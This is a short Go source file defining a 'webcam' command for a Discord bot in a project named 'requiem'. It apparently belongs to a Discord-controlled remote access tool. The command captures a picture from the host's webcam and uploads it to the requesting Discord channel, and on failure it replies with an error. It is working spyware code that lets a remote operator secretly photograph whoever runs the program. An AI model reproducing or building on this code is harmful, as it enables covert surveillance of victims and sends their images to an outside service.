package commands

import (
	"fmt"

	"requiem/funcs"

	"github.com/bwmarrin/discordgo"
)

func (*CamCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	pic, err := funcs.CaptureWebcam()
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to capture - %s", err), msg.Reference())
		return
	}

	ses.ChannelMessageSendComplex(msg.ChannelID, &discordgo.MessageSend{
		Reference: msg.Reference(),
		Files: []*discordgo.File{{
			Name:   "cam.jpg",
			Reader: pic,
		}},
	})
}

func (*CamCommand) Name() string {
	return "webcam"
}

func (*CamCommand) Info() string {
	return "Takes a picture from the webcam."
}

type CamCommand struct{}
